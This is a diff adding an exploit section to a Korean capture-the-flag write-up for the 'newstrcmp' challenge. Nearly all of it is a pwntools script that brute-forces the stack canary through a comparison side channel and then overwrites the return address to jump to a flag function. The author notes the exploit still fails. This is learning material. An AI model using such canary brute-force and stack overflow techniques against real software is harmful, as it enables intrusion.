@@ -117,3 +117,64 @@ newstrcmp 작동은
 * 패딩 (24바이트) + 카나리 (8바이트) + SFP (8바이트) + 플래그 주소 (0x40125b)
 
 
+## 3. 익스플로잇 코드
+
+
+```python
+from pwn import *
+
+p = remote("host3.dreamhack.games", 12585)
+elf = ELF("./newstrcmp") 
+context.arch = "amd64"
+context.log_level = "DEBUG"
+
+flag_addr = 0x40125b
+ret_gadget = 0x40101a 
+
+canary = b"\x00"
+print("[*] Starting Canary Brute-force...")
+
+for i in range(7):
+    for val in range(0x100):
+        p.sendafter(b"(y/n): ", b"n")
+        
+        # s1은 현재 시도 값 뒤에 더 큰 값(\xff)을 붙임
+        test_payload = b"a" * 0x18 + canary + p8(val)
+        p.sendafter(b"s1: ", test_payload + b"\xff")
+        p.sendafter(b"s2: ", test_payload)
+        
+        res = p.recvline()
+        if b"Result of newstrcmp:" in res and b"differs" not in res:
+            canary += p8(val)
+            print(f"[+] Found byte {i+1}/7: {hex(val)}")
+            break
+
+print(f"[*] Final Canary Found: {canary.hex()}")
+
+# 3. 최종 페이로드 전송 (BOF 실행)
+p.sendafter(b"(y/n): ", b"n")
+
+# 스택 구성: [buf: 24] + [canary: 8] + [SFP: 8] + [RET: flag]
+payload = b"a" * 0x18 + canary + b"b" * 8 + p64(flag_addr)
+
+p.sendafter(b"s1: ", b"dummy") # s1은 중요하지 않음
+p.sendafter(b"s2: ", payload)  # s2를 통해 스택 덮어쓰기
+
+# 4. 루프 탈출 및 결과 확인
+print("[*] Sending 'y' to trigger Return Address Overwrite...")
+p.sendafter(b"(y/n): ", b"y")
+
+# 5. EOF 방지를 위해 수동으로 데이터 읽기
+try:
+    # flag 함수가 실행되어 표준 출력으로 flag를 뱉을 때까지 대기
+    print("[+] Waiting for flag...")
+    flag = p.recvall(timeout=3)
+    print(f"\n[!!!] Captured Output:\n{flag.decode()}")
+except Exception as e:
+    print(f"[-] Error or Timeout: {e}")
+
+p.interactive()
+```
+
+
+그런데 이렇게해도 자꾸 플래그가 안나온다... 인터넷에서 여러 라이트업 찾아봤는데도 그렇다 
